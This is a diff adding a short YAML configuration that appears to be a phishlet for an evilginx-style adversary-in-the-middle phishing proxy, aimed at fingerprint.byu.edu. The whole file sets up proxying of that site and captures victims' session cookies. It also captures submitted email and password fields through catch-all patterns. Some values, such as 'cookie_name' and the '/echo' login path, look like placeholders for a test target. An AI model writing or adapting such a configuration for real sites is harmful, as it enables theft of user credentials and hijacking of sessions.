@@ -1,0 +1,18 @@
+min_ver: '3.0.0'
+proxy_hosts:
+   - {phish_sub: '', orig_sub: '', domain: 'fingerprint.byu.edu', session: true, is_landing: false, auto_filter: true}
+auth_tokens:
+  - domain: 'fingerprint.byu.edu'
+    keys: ['cookie_name']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'fingerprint.byu.edu'
+  path: '/echo'
